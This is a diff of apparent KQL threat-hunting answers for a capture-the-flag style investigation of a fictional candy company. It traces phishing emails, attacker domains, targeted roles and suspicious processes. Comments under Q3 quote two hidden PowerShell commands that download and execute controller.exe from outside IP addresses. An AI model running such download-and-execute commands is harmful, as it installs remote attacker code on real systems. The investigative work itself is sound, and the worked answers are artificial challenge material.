@@ -328,12 +328,137 @@ InboundNetworkEvents
 
 InboundNetworkEvents
 | where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
-| distinct src_ip
+| distinct src_ip 
 
 // Q2 - These users were certainly behaving strangely. What content were they sending around?
 let noesy_ips =
 InboundNetworkEvents
 | where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
 | distinct src_ip;
+let sneaky_domains =
+PassiveDns
+| where ip in (noesy_ips)
+| distinct domain;
+let curious_ips =
+OutboundNetworkEvents
+| where url has_any (sneaky_domains)
+| distinct src_ip;
+let curious_emails = 
 Employees
-| where ip_addr in (noesy_ips)
+| where ip_addr in (curious_ips)
+| distinct email_addr;
+Email
+| where sender has_any (curious_emails) and recipient has_any (curious_emails)
+// They are sending around a youtube video link.
+
+// Q3 - What is the name of that file?
+let noesy_ips =
+InboundNetworkEvents
+| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
+| distinct src_ip;
+let sneaky_domains =
+PassiveDns
+| where ip in (noesy_ips)
+| distinct domain;
+let curious_ips =
+OutboundNetworkEvents
+| where url has_any (sneaky_domains)
+| distinct src_ip;
+let curious_hostnames = 
+Employees
+| where ip_addr in (curious_ips)
+| distinct hostname;
+ProcessEvents
+| where hostname in (curious_hostnames)
+| where process_commandline contains "download"
+| summarize count()by process_commandline
+// Found by looking through the process commandline without the download filter the first time. Saw whoami and some other commands. looked below there.
+// powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://68.45.221.34/controller.exe'))"
+// powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://196.2.219.94/controller.exe'))"
+
+
+// Group of investtigative commands 
+Email
+| where link has_any (sneaky_domains)
+| summarize count()by link
+
+FileCreationEvents
+| where filename has "research.docx"
+// AEI8-LAPTOP - caames - 2023-09-29T10:23:35Z
+
+Employees
+| where hostname == "AEI8-LAPTOP"
+// carol_ames@spookysweets.xyz - 10.10.1.170
+
+Email
+| where sender == "carol_ames@spookysweets.xyz"
+
+ProcessEvents
+| where hostname == "AEI8-LAPTOP"
+
+
+PassiveDns
+| where ip == "196.2.219.94"
+// regulationscompliance.com
+
+OutboundNetworkEvents
+| where url contains "regulationscompliance.com"
+// END
+
+// Q4 - Find the initial access vector for this intrusion. What message did it include about 10/31?
+let noesy_ips =
+InboundNetworkEvents
+| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
+| distinct src_ip;
+let sneaky_domains =
+PassiveDns
+| where ip in (noesy_ips)
+| distinct domain;
+Email
+| where link has_any (sneaky_domains)
+// REad the list of subjects.
+// Your facility is closing on October 31.
+// https://healthcompliance.net/online/modules/actionrequired.docx
+
+// Q5 - Which role did the actors primarily target?
+let noesy_ips =
+InboundNetworkEvents
+| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
+| distinct src_ip;
+let sneaky_domains =
+PassiveDns
+| where ip in (noesy_ips)
+| distinct domain;
+let targets =
+Email
+| where link has_any (sneaky_domains)
+| distinct recipient;
+Employees
+| where email_addr in (targets)
+| distinct role
+// Regulatory Candy Specialist
+
+// Q6 - Once the threat actor got in to the environment, they were interested in another type of recon and were trying to figure out how to do it. Who helped them indirectly? 
+let noesy_ips =
+InboundNetworkEvents
+| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
+| distinct src_ip;
+let sneaky_domains =
+PassiveDns
+| where ip in (noesy_ips)
+| distinct domain;
+let targets =
+Email
+| where link has_any (sneaky_domains)
+| distinct recipient;
+Employees
+| where email_addr in (targets)
+
+// Q8
+let noesy_ips =
+InboundNetworkEvents
+| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
+| distinct src_ip;
+PassiveDns
+| where ip in (noesy_ips)
+| distinct domain
